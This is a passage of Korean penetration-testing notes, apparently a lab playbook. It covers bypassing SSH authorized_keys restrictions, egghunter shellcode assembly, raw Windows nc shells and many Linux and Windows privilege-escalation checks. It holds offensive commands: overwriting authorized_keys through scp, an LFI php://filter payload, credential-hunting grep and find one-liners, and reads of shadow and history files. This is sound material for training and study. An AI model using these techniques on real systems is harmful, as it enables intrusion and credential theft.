**먼저 「인증 실패」와 「인증 성공 + 제한」을 가를 것.** 이 둘을 섞으면 키를 다시 찾느라 시간을 태움:

| 증상 | 의미 | 다음 수 |
|---|---|---|
| `Permission denied (publickey)` | **인증 실패.** 키가 안 맞거나 계정이 없음 | 키·사용자명 재확인 |
| 접속은 되는데 프롬프트 대신 메시지·즉시 종료 | **인증 성공 + 제한.** `command=` · `no-pty` · 제한 셸(rbash) | `authorized_keys` 를 손에 넣었다면 **옵션 필드부터 읽을 것** |
| `PTY allocation request failed` | `no-pty` | `ssh -T` 로 비대화형 명령만 시도 |

⚠️ **괄호 안은 「서버가 허용하는 인증 «방식» 목록」임.** `(publickey)` 면 패스워드 인증이 아예 꺼져 있다는 뜻이라 **패스워드 브루트·스프레이는 무의미함.** `(publickey,password)` 면 그때 비로소 패스워드 공략이 성립함 — 한 글자 차이로 몇 시간이 갈림.

**메커니즘** — `authorized_keys` 옵션 필드(`command=`·`no-pty`·`no-port-forwarding`)는 **그 줄의 키로 인증했을 때만** 적용되는 서버측 제약임. `command=` 는 클라이언트가 요청한 명령을 버리고 지정 프로그램만 실행하며, 버려진 원래 명령은 `SSH_ORIGINAL_COMMAND` 로 전달됨.
그런데 **이 파일 자체가 세션 사용자 소유이면**, 허용된 그 프로그램이 임의 경로 쓰기가 가능한 한(`scp` 가 전형) **제한을 정의하는 파일 자체를 덮어쓸 수 있음.** 옵션 필드만 지운 `authorized_keys` 를 같은 경로에 얹으면 다음 접속부터 제한이 사라짐.

```text
scp 전용 채널 → ~/.ssh/authorized_keys 덮어쓰기 → 옵션 필드 제거 → 다음 접속은 완전한 셸
```

**덮어쓸 때 지킬 것 둘:**
1. **키 본문은 그대로 둘 것** — 내가 가진 개인키에 대응해야 하는 공개키임. 지울 것은 앞의 옵션 필드뿐
2. **퍼미션** — sshd 는 `StrictModes yes`(기본값)에서 `~/.ssh` 가 그룹·타인 쓰기 가능하면 키를 거부함. scp 는 원본 모드를 보존하므로 로컬에서 `chmod 600 authorized_keys` 를 유지한 채 올릴 것
3. **올린 뒤 되읽어 `diff` 로 확인할 것** — `scp -O -i id_rsa max@TARGET:~/.ssh/authorized_keys ./verify.txt`. 전송 성공 배너는 판정이 아님(A-12 · B-82)

**미리 못 읽는 실전 상황의 탐침 3종:**
```bash
ssh -i id_rsa <user>@TARGET 'id'                      # 강제 명령 여부 확인
ssh -i id_rsa <user>@TARGET -T 'bash -i'              # PTY 없이 셸 시도
ssh -i id_rsa <user>@TARGET -o RemoteCommand=none -N  # 세션만 유지
```

**일반화 — 「제한된 원시(primitive)」를 만나면 그 원시로 «제한 자체»를 건드릴 수 있는지 먼저 볼 것:**
- **쓰기만 되는 원시** → `~/.ssh/authorized_keys`(내 키 추가) · `~/.bashrc`(다음 로그인 시 실행) · `/etc/passwd`(해시 삽입) · cron 파일
- **읽기만 되는 원시(LFI)** → `/proc/self/environ` · 로그 포이즈닝 · 설정 파일의 DB 자격증명
- **명령 하나만 되는 sudo 항목** → GTFOBins 의 그 바이너리 탈출 구문

질문은 항상 같음 — **「내가 건드릴 수 있는 것 중에 나를 가두는 규칙이 들어 있는가?」**

⚠️ **원본을 지우고 다시 만들지 말 것.** [[Sorcerer]] 시행착오 — `rm authorized_keys` 후 공개키만으로 재구성했다가 접속이 깨져 `cp authorized_keys.bak authorized_keys` 로 되돌렸음. **덮어쓰기 전에 백업을 만들고, 편집은 옵션 필드 제거만 할 것.**
⚠️ 같은 이력에 **`ssh -O -i ./id_rsa authorized_keys max@…` 를 3회** 친 흔적이 있음 — `-O` 는 `scp` 의 플래그이지 `ssh` 의 것이 아님(`ssh -O` 는 제어 소켓 명령). **막혔을 때 플래그를 다른 도구에 옮겨 붙이는 것이 흔한 시간 낭비임.**

**출처** — [[Sorcerer]](`command="/home/max/scp_wrapper.sh"`). `scp` 가 그 래퍼에서 거부되는 별개 문제는 A-37.

#### A-3-15. 익스플로잇은 성공했는데 셸이 «아무 메시지 없이» 안 붙는다 — 에그헌터면 egg 소실부터

**증상** — 전송 정상(HTTP 200 또는 무응답), 오버플로우 성공, 에그헌터도 실행됨. 그런데 태그가 메모리에 없어 **영원히 스캔만 함.** 크래시도 에러도 로그도 없고 `nc` 가 그냥 안 붙음.

**원인은 대개 변수명 충돌임.** msfvenom `-f python` 의 기본 변수명이 `buf` 이고 **출력 첫 줄이 대입문**임:
```python
buf =  b""
buf += b"\x31\xc9..."
```
에그헌터 PoC 는 이렇게 시작함:
```python
egg="b33fb33f"
buf= egg
buf += "\x31\xc9\x83\xe9\xae..."
```
**msfvenom 출력을 통째로 붙여넣으면 `buf = b""` 가 `buf = egg` 를 덮어써서 태그 `b33fb33f` 가 사라짐.** 이 상태에서 「오프셋이 틀렸나」·「리턴 주소가 안 맞나」·「OS 가 달라서인가」를 의심하기 시작하면 **몇 시간이 날아감.**

**이식 방법 셋:**
1. msfvenom 출력의 첫 줄 `buf = b""` 만 지우고 나머지 `buf += …` 를 `buf = egg` 아래에 붙임
2. `-v shellcode` 로 변수명을 바꿔 생성한 뒤 `buf = egg + shellcode` 로 조립
3. python2 PoC 라면 `b""` 접두사를 지움(py2 에서 `b""` 는 그냥 `str` 이라 안 지워도 동작함)

**보내기 전에 조립 결과를 눈으로 볼 것** — 길이·시작 바이트·끝 바이트 셋이면 충분함:
```python
print len(buf), repr(buf[:8])    # 'b33fb33f' 로 시작해야 함
```
⚠️ **대기 시간과 혼동하지 말 것.** 에그헌터는 프로세스 메모리 전체를 훑으므로 원래 수 초~수십 초가 걸림(PoC 기본 `time.sleep(30)`, 저자 주석은 「안 되면 60으로」). **90초를 넘겨도 안 붙으면 대기 문제가 아님** — egg 소실과 badchar 를 먼저 의심할 것(B-92 · B-93).

**누적 패턴 — 「조용한 실패가 가장 비싸다」.** [[Twiggy]] `Successfully scheduled job`(예약 ≠ 실행) · [[Squid]] `certutil … completed successfully`(파일은 없었음)와 같은 계열이고, 여기서는 **아예 아무 메시지도 없어서** 더 위험함(A-12).

[[Kevin]] `[가정]` — 실제로 어떤 방법으로 이식했는지는 기록에 없음. 익스플로잇이 성공했으므로 **에그가 보존됐다는 것만 확정**임.

#### A-3-16. Windows 원시 `nc` 셸에서는 Ctrl+C 가 셸을 죽인다

- Ctrl+C 를 누르면 셸이 죽음(nc 가 끊김). **명령을 중단할 방법이 없으니** `dir /s` 처럼 오래 걸리는 것을 조심할 것
- 대화형 프로그램 불가 — `runas` · `net user` 확인 프롬프트 · 편집기
- 탭 완성·방향키 히스토리 없음
- **Linux 방식 TTY 업그레이드가 Windows 에는 없음.** `python3 -c 'import pty'` 는 해당 없음(A-38 은 리눅스 판임)
- 개선은 Kali 쪽에서 `rlwrap nc -nv <ip> <port>` 로 붙어 히스토리·행 편집을 얻는 것 — **Windows 셸에서 유일하게 쉬운 개선**임(B-89)

**따라서 플래그를 못 찾을 때 `-Recurse` 를 쓰지 말 것:**
```cmd
dir C:\Users\*\Desktop\*.txt /s /b
where /r C:\Users proof.txt
where /r C:\ local.txt
dir C:\ /b
```
마지막 줄 — 루트에 덩그러니 있는 경우가 있음. PowerShell `Get-ChildItem -Recurse` 는 셸을 몇 분간 블로킹시키는데 **Ctrl+C 가 셸을 죽이므로 빠져나올 방법이 없음.**

**셸에서 에코가 두 번 보이는 것은 정상임** — 원시 소켓 셸이라 내가 친 글자가 그대로 되돌아옴([[Kevin]] 의 `whoami` 2회 표시). 대화형 셸 승격 경로는 A-3-13.

#### A-3-17. Windows 셸인데 Linux 반사로 치고 있다

**증상** — `'x' is not recognized as an internal or external command` 가 **반복**됨. `ls` 하나로 끝나지 않고 `cat`·`grep`·`which`·`ifconfig`·`ps` 까지 연달아 헛돎.

⚠️ **A-3-11 과 원인이 다름 — 먼저 갈라야 함.** A-3-11 은 「명령은 실재하는데 PATH 가 없어 못 찾는」 경우이고(대처는 절대경로), 이것은 **애초에 그런 명령이 없는** 경우임. 판별은 `dir C:\Windows\System32\whoami.exe` 한 줄 — 파일이 있으면 A-3-11, 없으면 이 항목임.

| Linux | cmd.exe | PowerShell |
|---|---|---|
| `ls` | `dir` | `Get-ChildItem`(`ls` 별칭 있음) |
| `cat` | `type` | `Get-Content` |
| `grep` | `findstr` | `Select-String` |
| `which` | `where` | `Get-Command` |
| `ifconfig` | `ipconfig` | `Get-NetIPAddress` |
| `ps` | `tasklist` | `Get-Process` |
| `find / -name x` | `where /R C:\ x` | `Get-ChildItem -Recurse -Filter x` |
| `wget` | `certutil -urlcache -split -f` | `iwr -Uri … -OutFile …` |

→ **cmd 셸을 잡았으면 PowerShell 로 갈아탈지 즉시 판단할 것** — `powershell -nop -ep bypass` 한 줄이면 오른쪽 칼럼을 전부 씀. 단 **PowerShell 은 AMSI·스크립트 블록 로깅에 훨씬 잘 잡히므로**(A-35) 탐지를 신경 쓰는 상황이면 cmd 가 조용함.
→ [[Osaka]] 실측 — `C:\Users\Wilson\Desktop>ls` 로 시작한 헛돎이 캡처에 남아 있음. 전송 도구는 `certutil` 이었고 그 함정은 B-82 · B-8-11.

### A-4. 권한상승

#### A-41. 셸은 잡았는데 권한상승 실마리가 없다

**한 번에 털 것.** 명령 자체는 30초인데 하나씩 치면 왕복 때문에 5분이 됨.

```text
~/PG/_lib/harvest.sh
```
한 번에 수집: `id` · `sudo -l` · SUID · SGID · `getcap` · crontab 3종 · `ss`/`netstat` · `ps auxf` · `/etc/passwd` · shadow · `dpkg -l` · 쓰기가능 디렉터리 · hosts · routes · 플래그 전수 탐색(값 포함). `sh` 전용이라 낡은 박스에서도 돎.

**권한상승 인과는 추측하지 말고 실측할 것** — `/proc/<PID>/stat` 으로 조상을 거슬러 「왜 root 로 도는지」를 확인([[Fowsniff]] 사례).

⚠️ **셸 안에서 친 명령은 `~/.zsh_history` 에 안 남음.** 지금 파일로 떨어뜨리지 않으면 영영 못 씀([[Flu]] 노트가 「셸 잡은 뒤」를 통째로 비워야 했던 이유).

**Windows 에서 커널·서비스·토큰·SMB 경로가 전부 막히면 파일에 남은 자격증명으로 전환할 것.** [[Robust]]: `whoami /all` 에 `SeImpersonatePrivilege` 없음(Potato 계열 불가) · `systeminfo` `Access denied`(hotfix 기반 커널 익스플로잇 경로 봉쇄) · `Get-CimInstance`/`Get-ScheduledTask` 전부 CIM 접근거부 · `netstat -ano` 로 본 내부 리슨 포트(135·139·445·5040·7680)가 외부 nmap 에는 안 잡혀 호스트 방화벽이 막고 있음을 확인 — 네트워크 쪽도 더 팔 것이 없었음. 막다른 길을 빨리 확인하고 Sticky Notes(B-43) 로 방향 전환한 것이 시간 절약이었음.

**⚠️ root 를 잡았으면 «열거하기 전에» `id` 로 euid 를 확인할 것.** [[GLPI]]: `/tmp/rootbash -p -c "sh /tmp/.h.sh"` 로 harvest 를 돌려 **euid 가 dash 에서 날아갔고**, 그 결과 `/etc/shadow`·root 크론 같은 root 전용 정보를 **하나도 못 걷은 채** 박스를 정지시킴. 다시 걷을 방법 없음. 메커니즘과 재현은 B-33.
**root 획득 직후가 증거를 걷을 유일한 창임**(C-3) — 스크립트를 넘길 때는 `sh x.sh` 가 아니라 `bash -p x.sh`.

**⚠️ `sudo -n` 의 실패는 「막혔다」가 아니라 「비밀번호를 넣고 다시 치라」는 뜻임.** `sudo: a password is required` 를 보고 「sudo 없음」으로 접는 사고가 실제로 남 — 크랙·재사용으로 비밀번호를 이미 쥐고 있으면 **`sudo -S -l` 을 반드시 다시 칠 것.** harvest 스크립트의 `sudo -n` 결과만 보고 판단하지 말 것([[Graph]] · [[Fikklish]]).
**그리고 그 출력을 파일로 남길 것.** [[Graph]] 는 안 남겨서 `sudo -l` 원문이 통째로 사라졌고 `/usr/local/bin/pass-gen` 이라는 이름이 익스플로잇 스크립트의 호출문 한 줄로만 남음. **권한상승 서술에서 심사관이 제일 먼저 보는 줄이 허용 조건(NOPASSWD 여부·인자 제한)인데 그것을 보고서에 못 씀.**

**재확인의 트리거는 `id` 의 보조 그룹임.** `-n` 은 「비밀번호 프롬프트를 절대 띄우지 말라」는 뜻이라, 인증이 필요한 상태면 목록을 걸러 보여주는 게 아니라 **아예 물어보지 못하고 죽음** — 「항목이 없다」가 아니라 **「못 물어봤다」**임.
[[LazySysAdmin]] 실측 — `harvest.sh` 의 SUDO 섹션은 `sudo: a password is required` 한 줄로 끝나 「sudo 경로 없음」으로 읽히지만 실제 답은 `(ALL : ALL) ALL` 이었음. 구한 것은 첫 SSH 의 `id` 로, `groups=...,27(sudo),...` 를 보고 곧장 `echo '<pw>' | sudo -S -l` 로 다시 친 것. **순서가 반대였으면 그대로 막혔을 것**(스크립트는 root 를 잡은 뒤에야 돌았음). 이 사고 때문에 `~/PG/_lib/harvest.sh` 에 `HARVEST_PW` 환경변수를 넣어 `sudo -S -l` 을 추가로 돌리도록 고쳤음(C-2).

**Windows 표준 벡터 소거 실측**([[Mice]], `harvest.ps1` 을 divine(Medium IL) 권한으로) — 토큰 특권에 `SeImpersonatePrivilege` 없음(Potato 계열 불가) · 로컬 admin 그룹 멤버는 `Administrator` 단독 · `AlwaysInstallElevated` 양쪽 하이브 모두 키 없음 · SeriousSAM 은 `C:\Windows\System32\config\SAM: Access is denied.` · 쓰기 가능한 서비스 바이너리 없음 · 비-MS 예약작업은 OneDrive 뿐 · 저장된 자격증명은 `LegacyGeneric:target=XboxLive` 하나 · PowerShell 히스토리 없음.
→ **여기서 「설정 파일 자격증명」으로 방향을 튼 것이 옳았음**(B-64). 다음 순서는 FileZilla · PuTTY · WinSCP · `unattend.xml` · PowerShell 히스토리.
→ **이미 설치된 서드파티 GUI 앱 자체가 벡터일 수 있음.** [[Mice]] 는 진입에 쓴 Remote Mouse 가 권한상승 취약점도 같이 갖고 있었음(CVE-2022-3365 → CVE-2021-35448). **「진입에 쓴 소프트웨어」를 권한상승 후보에서 빼지 말 것.**

**⚠️ 저권한 열거 결과의 빈칸을 「없음」으로 읽지 말 것 — 6,692행 → 9,282행.**
[[Mice]] 에서 **같은 `harvest.ps1` 을 divine(Medium IL)과 SYSTEM 으로 각각** 돌렸음. divine **6,692행** → SYSTEM **9,282행**, 차이 **2,590행.** 16개 열거 섹션을 전부 완주하고 `===== DONE =====` 마커까지 찍혔으니 스크립트가 중간에 죽어 짧았던 것이 아님. 저권한에서는 **서비스 DACL·다른 사용자 프로필·레지스트리 하이브·예약작업 상세가 조용히 잘려서** 돌아옴 — 에러가 아니라 그냥 빈 줄로 옴.
→ **권한을 올렸으면 같은 열거를 그 권한으로 다시 돌릴 것.** 「감」이 아니라 이 숫자임. 저권한 열거 결과를 「이 박스엔 아무것도 없다」의 근거로 쓰지 말 것.

**`.bash_history` 가 `/dev/null` 이어도 «클라이언트» 히스토리를 볼 것.** 셸 히스토리만 지우고 클라이언트 것을 빠뜨리는 것이 흔한 패턴임 — `.psql_history` · `.mysql_history` · `.rediscli_history` · `.python_history` · `.viminfo` · `.lesshst`.
[[Fikklish]] 실측 — tom 홈의 `.bash_history` 는 `/dev/null` 링크였으나 **`.psql_history` 는 살아 있었고**, 거기 남은 평문 DB 비밀번호(`ALTER USER WEBLATE PASSWORD '...'`) 중 **최신 값이 tom 의 시스템(SSH/sudo) 비밀번호로 재사용**돼 있었음.

**`id` 는 uid 만 보지 말고 `groups=` 를 끝까지 읽을 것.** 뒤쪽이 통째로 별개의 경로 목록임 — `lxd`·`docker`·`disk`·`shadow`·`adm` 은 각각 다른 길이고, **셸을 잡은 첫 30초에 공짜로 보이는 정보**임(C-2).
[[Fikklish]] — tom 이 `groups=1000(tom),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd)` 로 **`110(lxd)`** 를 갖고 있었음. `[가정]` `sudo -l` 이 이미 열려 있어 **lxd 경로는 시도하지 않았음.** lxd 그룹 멤버는 컨테이너를 만들어 호스트 `/` 를 `security.privileged=true` 로 마운트하면 사실상 root 이므로, `sudo` 가 없거나 비번을 못 구했으면 그쪽이 다음 후보였음. ⚠️ **이 박스에 lxd 데몬이 실제로 떠 있었는지, 사용 가능한 이미지가 있었는지는 보지 않았음**(관측 없음).

**SUID·caps·cron 이 전부 배포판 표준이면 답은 `ss -lntp` 의 내부 리슨 포트에 있음.** [[Outdated]] — SUID 17개가 Ubuntu 20.04 표준 목록 그대로, capabilities 5개도 전부 네트워크용(`cap_net_raw`·`cap_net_bind_service`), `/etc/cron.d` 도 배포판 기본(`e2scrub_all`·`php`·`popularity-contest`), `sudo` 는 비번을 넣어도 `Sorry, user svc-account may not run sudo on outdated.`

남은 단서는 `ss` 한 줄이었음:
```text
LISTEN  0        4096             0.0.0.0:10000          0.0.0.0:*              
```
— 출처: `~/PG/Outdated/enum_user.txt`

nmap 이 `10000/tcp filtered` 로 본 포트였고, 바인딩은 **`0.0.0.0`** 이라 로컬 전용 서비스가 아니었음 — 밖에서 안 보인 것은 **경로상 방화벽**이 삼킨 결과. 여기서 SSH `-L` 로 끌어와 Webmin 1.996(CVE-2022-36446)으로 root 를 잡음(B-71 · B-1-24).
→ **저권한 열거가 전부 「표준」으로 나오면 그것은 빈손이 아니라 「네트워크 쪽을 보라」는 신호임.** C-2 의 `ss -lntp` 를 빠뜨리면 이 박스는 통째로 막힘.

**추론이 맞아도 «끝까지» 맞아야 크리덴셜이 나옴.** [[Monster]] — `INTERACTIVE` + `CONSOLE LOGON` 관측에서 「자동 로그온이 켜져 있을 것 → 평문 비번이 레지스트리에 있을 것」까지는 옳았고 `AutoAdminLogon` 도 실제로 `1` 이었음. **틀린 것은 그다음 반 걸음** — `netplwiz`/`Autologon` 으로 설정한 자동 로그온 비번은 레지스트리가 아니라 **LSA Secret** 으로 감. 게다가 `AutoLogonSID` 의 대상이 Administrator 도 아닌 **낮은 권한 계정 본인**이었음. 1순위였던 후보가 가장 먼저 죽은 사례임.

**「없다」를 확인하는 데 드는 시간을 얕보지 말 것.** [[Monster]] 의 `Get-ChildItem -Path C:\ -Include *.kdbx,unattend.xml,… -Recurse` 한 줄이 **7분 넘게** 돌았고, Nishang 계열 리버스셸은 `iex $data 2>&1 | Out-String` 로 **명령이 끝나야 출력을 한 번에** 보내므로 진행 상황이 안 보여 죽었는지 도는지 구분이 안 됐음.

**같은 증상의 다른 데이터 포인트** — [[Squid]]: `Get-ChildItem C:\ -Recurse` 로 `local.txt` 를 찾다 리버스셸이 수 분간 무응답. **`dir C:\` 한 번으로 끝났음** — 플래그가 `C:\local.txt` 라는 비표준 위치에 있었기 때문임. 더 싼 대안:
```cmd
dir C:\ /b
where /r C:\ local.txt
cmd /c dir C:\*.txt /s /b 2>nul
```
→ **`C:\Users\*\Desktop\local.txt` 패턴만 찾으면 일반 유저 계정이 없는 박스에서 영원히 못 찾음.** 재귀 전에 `dir C:\` 로 비표준 위치부터 볼 것(C-3).
→ **전체 디스크 재귀는 마지막에 돌리거나 범위를 좁혀 던질 것**(`C:\Users`·`C:\Windows\Panther`). 그리고 **긴 명령은 결과를 파일로 떨어뜨리고 던질 것** — 그 7분 뒤에 온 출력은 스크롤백 저장 시점을 넘겨 파일로 남지도 못했음(A-68).

**SUID·capability 는 «목록»이 아니라 «배포판 기본과 다른 것»을 보는 것임.** [[Fowsniff]] — `/usr/bin/procmail` 이 SUID 로 있어 메일 서버와 관련 있어 보였으나 Ubuntu 16.04 의 `procmail` 패키지가 원래 SUID 로 설치되는 표준 바이너리였음. `getcap` 결과 셋(`systemd-detect-virt`·`mtr`·`traceroute6.iputils`)도 전부 배포판 기본값. `/etc/crontab` 도 배포판 원본 4줄뿐이고 `/etc/cron.d/` 에는 `popularity-contest` 만 있었음.
→ 기본 목록을 외우기 어려우면 **반대로 접근할 것** — `find / -perm -4000` 결과가 전부 `/bin`·`/usr/bin`·`/usr/lib` 안이고 `/opt`·`/usr/local`·홈에 아무것도 없으면 SUID 경로는 아닐 가능성이 높음.

**`id` 는 uid 뿐 아니라 «그룹»을 읽는 명령임.** [[Fowsniff]] 의 정답은 SUID 가 아니라 `gid=100(users)` 였음 — 기본 그룹이 자기 이름 그룹이 아니라 공유 그룹이면 그 자체가 냄새임(관리자가 「직원 전부가 만질 수 있게」라고 생각한 흔적).
```bash
find / -group <내그룹> -writable -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null
```
**SUID 다음 반사로 붙여둘 것.** 결과의 대부분은 자기 홈·`/run/user/<uid>` 라 소음이고, **눈은 `/opt`·`/usr/local`·`/srv`·`/var` 로 먼저 던질 것.** [[Fowsniff]] 는 그 필터 뒤에 `/opt/cube/cube.sh` 하나가 남았고 그것이 전부였음(B-3-11).

**`sudo -l`·`find -perm -4000`·`getcap` 셋이 다 빈손이면 그때가 «크론»과 «쓰기 가능 경로»를 볼 차례임.** [[Flimsy]] — 반사 5개 중 답이 두 개에 있었음. `sudo` 는 `a password is required`, SUID·capabilities 는 전부 우분투 20.04 배포 기본(비표준 0개), 그룹은 `nogroup` 하나뿐. 답은 `/etc/crontab` 의 `* * * * * root apt-get update` 와 `===== WRITABLE =====` 의 `/etc/apt/apt.conf.d` **두 줄을 나란히 놓는 것**이었음(B-34).
→ **`find / -writable -type d` 를 반사에 넣을 것.** 특히 **`/etc/` 아래 쓰기 가능한 디렉터리는 거의 항상 권한상승임.**

**`www-data`·`apache`·`nginx` 같은 웹 서비스 계정으로 떨어졌으면 SUID·크론보다 «웹루트 설정 파일»이 먼저임.** 서비스 계정은 SUID·크론이 걸릴 일이 거의 없고, 대신 애플리케이션 설정 파일 전량을 읽을 수 있음. [[Codo]] 는 `id` 가 `uid=33(www-data) gid=33(www-data) groups=33(www-data)` 로 특수 그룹이 하나도 없었고, harvest 5종이 전부 빈손인 대신 `sites/default/config.php` 한 줄로 끝났음.

**설정 파일 이름은 스택마다 정해져 있음 — 암기 대상임.** `find` 없이 바로 `cat` 할 것:

| 스택 | 설정 파일 | 흔한 위치 |
|---|---|---|
| CodoForum | `config.php` | `<웹루트>/sites/default/config.php` ([[Codo]]) |
| WordPress | `wp-config.php` | `<웹루트>/wp-config.php` |
| Drupal | `settings.php` | `<웹루트>/sites/default/settings.php` |
| Joomla | `configuration.php` | `<웹루트>/configuration.php` |
| Magento | `env.php` | `app/etc/env.php` |
| Laravel · Symfony · 범용 | `.env` | 프로젝트 루트(숨김 파일이라 `ls -la`) |
| Django | `settings.py` · `local_settings.py` | `<프로젝트>/<앱>/settings.py` |
| Rails | `config/database.yml` · `config/secrets.yml` | 프로젝트 루트 |
| Spring Boot | `application.properties` · `application.yml` | `src/main/resources/`, jar 내부 |
| Node.js | `config.json` · `.env` · `ecosystem.config.js` | 프로젝트 루트 |
| ASP.NET | `web.config` · `appsettings.json` | 앱 루트 |
| Tomcat | `tomcat-users.xml` | `/etc/tomcat*/` · `$CATALINA_HOME/conf/` |
| phpMyAdmin | `config.inc.php` | `/etc/phpmyadmin/` · `<웹루트>/phpmyadmin/` |

표에 없는 제품이면 전수 검색 — **이름보다 내용으로 찾는 쪽이 회수율이 높음:**
```bash
grep -rn "password" /var/www --include="*.php" 2>/dev/null
grep -rniE "pass(word|wd)?\s*[=:>]|DB_PASS|secret|api[_-]?key" /var/www 2>/dev/null | head -50
find / -name "config*.php" 2>/dev/null
find / \( -name ".env" -o -name "*.yml" -o -name "*.ini" -o -name "settings.py" \
       -o -name "web.config" -o -name "application*.properties" \) 2>/dev/null | grep -v -E '^/(proc|sys|usr/share)'
ls -la /var/www/html /home/* /opt/* 2>/dev/null
cat /home/*/.bash_history /root/.bash_history 2>/dev/null
find / \( -name "*.bak" -o -name "*.old" -o -name "*~" -o -name "*.save" -o -name "*.orig" \) 2>/dev/null
```
- `2>/dev/null` — 필수. 빼면 `Permission denied` 가 수천 줄 쏟아져 진짜 결과가 묻힘. 서비스 계정은 대부분의 디렉터리에 접근 못 함
- `--include="*.php"` — 빼면 바이너리·이미지까지 뒤져 몇 분씩 걸리고 이진 매칭 잡음이 섞임
- `grep -v -E '^/(proc|sys…'` — 가상 파일시스템 제외. 빼면 `/proc` 순회로 결과가 오염됨(A-42)

⚠️ **`config.php.example` 이 옆에 있으면 `diff` 를 칠 것** — 관리자가 «무엇을 바꿨는지»만 뽑아내는 지름길임([[Codo]] 의 `sites/default/` 에 실재).
⚠️ **`.php` 설정 파일은 웹으로 직접 열어도 소스가 안 보임** — 서버가 실행해버리기 때문임. `defined('IN_CODOF') or die();` 같은 가드가 있으면 200 에 빈 본문이 옴. 「파일이 없다」가 아니라 「파싱하고 즉시 종료했다」임([[Crane]] 에서 실측). LFI 가 있으면 `?page=php://filter/convert.base64-encode/resource=sites/default/config.php`(B-1-30).

**⚠️ `whoami /all` 한 번으로 「특권 없음」을 확정하지 말 것.** 낮은 권한에서 안 보이던 서비스·작업·파일이 상위 권한에서는 보임. [[PwnLab]] 에서 `find / -perm -4000` 이 `/home/*` 의 `drwxr-x---` 때문에 커스텀 SUID 를 놓친 것과 **정확히 같은 함정**이고, [[Monster]] 도 mike 권한으로는 `C:\Users\Administrator` 안이 통째로 안 보이는 벽 앞에서 멈췄음. `SeImpersonate` 도 서비스도 예약작업도 자격증명 파일도 SAM 도 전부 막혔다면 — 남은 것은 대개 **내가 아직 열거하지 못한 영역**임.

**[[PwnLab]] 상세 — 그 「빠진 두 줄」이 권한상승 경로 전체였음.** www-data 시점 `harvest.sh` 의 SUID 목록은 배포판 표준 15개뿐이라 「커스텀 SUID 없음」으로 읽혔음:
```text
$ diff <(sed -n '/===== SUID/,/^===== SGID/p' harvest_www-data.txt) \
       <(sed -n '/===== SUID/,/^===== SGID/p' harvest_root.txt)
> /home/mike/msg2root
> /home/kane/msgmike
```
`/home/*` 이 `drwxr-x---` 라 `find` 가 못 들어갔고, `Permission denied` 는 `2>/dev/null` 로 버려져 **에러조차 안 남음.** 침묵이 곧 「없음」으로 보이는 형태라 시험장에서 사람을 통째로 헛다리 짚게 만듦.
→ **사용자 계정을 옆걸음(su·SSH 등)으로 얻을 때마다 SUID·크론·`getcap` 열거를 그 계정 권한으로 다시 돌릴 것.**

⚠️ **`find -perm -4000` 의 «선행 하이픈»을 빠뜨리면 거의 아무것도 안 나옴.** `-perm 4000` 은 「모드가 정확히 4000」(=`---S------`)이라는 뜻이라 실재하는 SUID 바이너리(대개 `4755`)가 전부 탈락함. `-perm -4000` 이 「4000 비트를 «포함»」임. **0건을 「SUID 없음」으로 읽기 전에 이 하이픈부터 확인할 것**(위 「부재를 침묵으로 읽지 마라」와 같은 자리).

**여러 후보가 동시에 보이면 «싼 것부터» 칠 것.** [[Sorcerer]] 는 SUID·NFS·커널·Tomcat manager 넷이 동시에 열려 있었음:

| 후보 | 비용 | 위험 | 판정 |
|---|---|---|---|
| 비표준 SUID 바이너리 | `find` 한 줄 + GTFOBins 조회 | 없음 | **1순위.** 실제로 여기서 끝났음 |
| NFS `no_root_squash` | `showmount -e` 두 줄 | 없음 | 2순위. 열려 있으면 SUID 심기로 즉시 끝남(F 절) |
| Tomcat manager 배포 | 자격증명 필요 + WAR 조립 | 낮음 | 3순위. 앱 계정 권한까지만 |
| 커널 익스플로잇 | 컴파일 + 전제조건 검증 | **박스가 죽음** | **최후.** 리버트 20분(B-24) |

→ **판정 기준은 「성공 확률 × 성공 시 이득 ÷ 비용」이 아니라 「실패했을 때 되돌릴 수 있는가」임.** 커널만 유일하게 되돌릴 수 없어서 마지막임.
— 출처: `~/PG/PwnLab/harvest_www-data.txt`(31492B) vs `~/PG/PwnLab/harvest_root.txt`(36138B)

**`sudo` 가 아예 설치되지 않은 배포판 최소 설치도 있음 — 「막힘」이 아니라 「결론」임.** [[PwnLab]] — `harvest.sh` 의 SUDO 섹션이 `/tmp/h.sh: 30: /tmp/h.sh: sudo: not found` 로 끝남(Debian 8 최소 설치 기본 상태, root 셸에서 친 `which sudo` 도 빈손). `sudo -l` 을 반사적으로 먼저 치는 습관 때문에 여기서 멈칫하기 쉬운데 **없는 것도 정보임** — `command not found` 는 실패가 아니라 「sudo 경로 자체가 없다」는 결론이므로 곧장 SUID·크론·capability 열거로 넘어갈 것.
⚠️ 위의 `sudo: a password is required`(재확인 필요)와 **문구가 다름** — 그쪽은 「못 물어봤다」이고 이쪽은 「존재하지 않는다」임. 섞지 말 것.
— 출처: `~/PG/PwnLab/harvest_www-data.txt` 의 `===== SUDO =====` 절(`which sudo` 빈손은 `~/PG/PwnLab/shell_www-data.log`)

**막다른 길로 접은 것들도 함께 남길 것**(A-2-27). [[PwnLab]] — `kent` 계정은 DB 비밀번호 재사용으로 로그인은 됐으나 홈이 완전히 비어 있었음. `/home/john` 도 존재하고 셸이 `/bin/bash` 인데 root 로 확인해도 dotfile 뿐이고 DB `users` 테이블에도 없음 — PG 가 추가한 장식으로 보임 `[가정]`(익스플로잇을 시도하지 않아 **검증 안 됨**). `mount.nfs` 가 SUID 이고 111/rpcbind 가 열려 있어 잠깐 눈길이 갔으나 `/etc/exports` 가 비어 있고 2049 도 안 열려 있어 경로가 아니었음.

**⚠️ 같은 실패가 「TTY 가 없어서」로도 나타남 — 권한 문제와 TTY 문제는 겉보기가 비슷함.** 리버스셸에서 `sudo -l` 을 쳤는데 비밀번호를 묻거나 `no tty present` 로 죽으면 「이 계정엔 sudo 권한이 없다」고 판단하고 SUID·cron 으로 넘어가기 쉬움.
→ **TTY 업그레이드를 먼저 하고 열거를 시작할 것.** [[Crane]] 에서 `sudo` 가 통한 이유는 `pty.spawn` 으로 TTY 를 이미 확보한 뒤에 `sudo -l` 을 쳤기 때문임 — **순서를 바꿔 raw 셸에서 바로 쳤다면 `no tty present` 로 막혀 「sudo 권한이 없다」고 오판했을 것**(A-38 · A-3-10).

